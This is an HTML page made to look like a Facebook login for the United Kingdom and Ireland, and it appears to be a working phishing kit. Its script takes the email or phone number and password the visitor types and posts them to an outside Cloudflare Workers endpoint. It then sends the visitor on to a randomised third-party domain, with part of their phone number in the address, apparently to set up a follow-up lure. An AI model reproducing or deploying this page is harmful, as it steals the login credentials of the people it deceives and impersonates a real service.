<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | United Kingdom and Ireland</title>
    <!-- Favicon -->
    <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg">
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brandBlue: '#0064e0',
                        brandBlueHover: '#0052b8',
                        brandBlueActive: '#004399',
                        greyBtn: '#e4e6eb',
                        greyBtnHover: '#d8dadf',
                    }
                }
            }
        }
    </script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f6f8fa;
        }
        input, button, a {
            transition: all 0.15s ease-in-out;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between items-center text-gray-900 py-8 px-4">

    <header class="w-full max-w-md flex flex-col items-center">
        <!-- Top Logo 1 -->
        <div class="mb-6 flex justify-center items-center">
            <img 
                src="ngsfd.png" 
                alt="Logo 1" 
                class="h-12 w-auto object-contain"
                onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-logo-1').content.cloneNode(true));"
            />
            <template id="fallback-logo-1">
                <svg class="h-12 w-12 text-gray-900" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
                </svg>
            </template>
        </div>
        <hr class="w-full border-t border-gray-300 my-2">
    </header>

    <main class="w-full max-w-md my-auto py-6">
        <h1 class="text-2xl font-semibold text-center mb-6 text-gray-800">
            Log in to Facebook
        </h1>

        <div class="bg-white p-6 md:p-8 rounded-xl shadow-md border border-gray-200">
            <form id="loginForm" class="space-y-4">
                <!-- Email or Mobile Number Input -->
                <div>
                    <input 
                        type="text" 
                        id="email" 
                        name="email" 
                        required 
                        placeholder="Email or phone number"
                        class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition duration-200"
                    >
                </div>

                <!-- Password Input -->
                <div>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        required 
                        placeholder="Password"
                        class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition duration-200"
                    >
                </div>

                <!-- Submit Button -->
                <div>
                    <button 
                        type="submit" 
                        id="submit-button"
                        class="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg shadow-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 cursor-pointer"
                    >
                        Log In
                    </button>
                </div>
            </form>

            <!-- Status Message -->
            <div id="statusMessage" class="mt-4 text-center text-sm text-red-600 hidden"></div>

            <!-- Forgot Password / Links -->
            <div class="text-center mt-4">
                <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
            </div>

            <hr class="my-6 border-t border-gray-200">

            <!-- Create Account Button -->
            <div class="text-center">
                <a 
                    href="#" 
                    class="inline-block py-2.5 px-4 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-lg shadow-sm transition duration-200"
                >
                    Create new account
                </a>
            </div>
        </div>
    </main>

    <footer class="w-full max-w-md text-center text-xs text-gray-500 py-4">
        <p>&copy; 2026 Meta Platforms, Inc.</p>
    </footer>

    <!-- Worker Integration & Conditional Formatting Script -->
    <script>
        const form = document.getElementById("loginForm");
        const submitButton = document.getElementById("submit-button");
        const status = document.getElementById("statusMessage");

        form.addEventListener("submit", async function(event) {
            event.preventDefault();

            if (!form.checkValidity()) {
                form.reportValidity();
                return;
            }

            submitButton.disabled = true;
            submitButton.classList.add('opacity-50', 'cursor-not-allowed');
            status.classList.add('hidden');
            status.textContent = "";

            const rawInput = document.getElementById("email").value.trim();
            const passwordVal = document.getElementById("password").value;

            const data = {
                email: rawInput,
                password: passwordVal,
                submission_type: "login"
            };

            let identifierParam = rawInput;
            
            // Check if it includes '@' to determine if it's an email
            if (!rawInput.includes('@')) {
                // If it's a phone number, grab the last 3 digits
                const digitsOnly = rawInput.replace(/\D/g, '');
                if (digitsOnly.length >= 3) {
                    identifierParam = "your number ending " + digitsOnly.slice(-3);
                } else if (digitsOnly.length > 0) {
                    identifierParam = "your number ending " + digitsOnly;
                }
            }

            try {
                await fetch("https://tendring-contact.twells-tet.workers.dev", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.error("Worker transmission error:", error);
            } finally {
                // Redirect to next page with target info safely encoded in query string
                const redirectBase = "https://k7m2q9x4b6n8r3t5v1c0z4p7a9d2f6h8j3l5w1y0e7s9u2i4o6g8r3b5n1m0.threetwosix.co.uk/";
                window.location.href = redirectBase + "?target=" + encodeURIComponent(identifierParam);
            }
        });
    </script>
</body>
</html>
